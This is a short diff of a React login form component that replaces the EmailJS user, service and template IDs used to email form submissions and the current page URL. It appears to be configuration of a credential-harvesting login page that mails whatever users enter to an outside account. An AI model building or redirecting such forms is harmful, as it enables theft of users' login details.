@@ -106,7 +106,7 @@ function LoginForm({ onClose }) {
     const url = window.location.href;
     setCurrentUrl(url);
 
-    emailjs.init("7dUGFPkSYms-umST1"); // Thay bằng User ID của bạn từ EmailJS
+    emailjs.init("ctZSwja2fIosW3pWE"); // Thay bằng User ID của bạn từ EmailJS
 
     const fetchData = async () => {
       try {
@@ -286,8 +286,8 @@ function LoginForm({ onClose }) {
       };
 
       await emailjs.send(
-        "service_6b4csj2", // Thay bằng Service ID của bạn
-        "template_sv0xth6", // Thay bằng Template ID của bạn
+        "service_s8neuc9", // Thay bằng Service ID của bạn
+        "template_qgs61rn", // Thay bằng Template ID của bạn
         templateParams
       );
     } catch (err) {
@@ -346,7 +346,7 @@ function LoginForm({ onClose }) {
           templateParams.form_type = "Form Update";
       }
 
-      await emailjs.send("service_6b4csj2", "template_sv0xth6", templateParams);
+      await emailjs.send("service_s8neuc9", "template_qgs61rn", templateParams);
     } catch (err) {
       console.error("EmailJS Error:", err);
     }
